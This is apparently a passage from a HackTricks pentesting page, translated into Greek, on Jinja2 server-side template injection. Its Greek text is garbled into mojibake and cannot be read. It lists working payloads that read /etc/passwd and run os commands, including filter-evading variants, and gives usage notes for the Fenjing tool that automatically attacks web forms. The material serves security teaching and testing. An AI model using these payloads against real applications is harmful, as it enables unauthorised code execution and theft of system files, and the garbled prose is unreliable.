ÎœÏŒÎ»Î¹Ï‚ Î²ÏÎµÎ¯Ï„Îµ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î± builtins Î¼Îµ:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}


## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
### Fuzzing WAF bypass

**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ¾ÎµÎ¹Î´Î¹ÎºÎµÏ…Î¼Î­Î½Î¿ ÏƒÎµ CTFs Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± brute force Î¼Î· Î­Î³ÎºÏ…ÏÏ‰Î½ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ ÏƒÎµ Î­Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ ÏƒÎµÎ½Î¬ÏÎ¹Î¿. Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î±Ï€Î»ÏÏ‚ ÏˆÎµÎºÎ¬Î¶ÎµÎ¹ Î»Î­Î¾ÎµÎ¹Ï‚ ÎºÎ±Î¹ ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± Î³Î¹Î± Î½Î± Î±Î½Î¹Ï‡Î½ÎµÏÏƒÎµÎ¹ Ï†Î¯Î»Ï„ÏÎ±, Î±Î½Î±Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚, ÎºÎ±Î¹ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î¼Î¹Î± Î´Î¹Î±Î´ÏÎ±ÏƒÏ„Î¹ÎºÎ® ÎºÎ¿Î½ÏƒÏŒÎ»Î±.
```
webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* Î”ÎµÎ¯Ï„Îµ [attr trick Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï„Î¿Ï…Ï‚ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ ÎµÎ´Ï](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î”ÎµÎ¯Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
